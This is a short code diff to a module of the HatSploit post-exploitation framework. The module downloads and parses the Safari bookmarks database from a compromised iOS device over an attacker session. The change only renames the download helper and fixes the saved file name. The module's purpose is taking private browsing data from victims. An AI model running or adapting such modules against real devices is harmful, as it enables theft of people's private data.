@@ -34,7 +34,7 @@ class HatSploitModule(Module, Sessions, DBTools):
         },
         'PATH': {
             'Description': "Path to save file.",
-            'Value': Loot().random_loot('db'),
+            'Value': Loot().specific_loot('Bookmarks.db'),
             'Type': None,
             'Required': True
         }
@@ -44,7 +44,8 @@ class HatSploitModule(Module, Sessions, DBTools):
         session, path = self.parse_options(self.options)
         bookmarks = '/private/var/mobile/Library/Safari/Bookmarks.db'
 
-        if self.download_from_session(session, bookmarks, path):
+        path = self.session_download(session, bookmarks, path)
+        if path:
             self.print_process("Parsing bookmarks database...")
 
             try:
